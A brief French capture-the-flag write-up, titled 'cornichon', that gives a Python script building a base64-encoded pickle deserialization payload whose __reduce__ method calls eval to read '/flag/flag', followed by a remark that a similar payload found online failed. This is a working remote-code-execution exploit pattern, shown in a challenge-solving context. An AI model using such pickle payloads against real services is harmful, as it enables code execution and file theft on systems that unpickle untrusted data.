# cornichon !

```
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        return (eval, ("open('/flag/flag').readlines()", ))

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
    #print(pickled)
```

Tentative avec un payload du même genre trouvé sur le net, mais non
fonctionnel, probablement car je n'avais pas accès aux imports nécessaires du
payload.
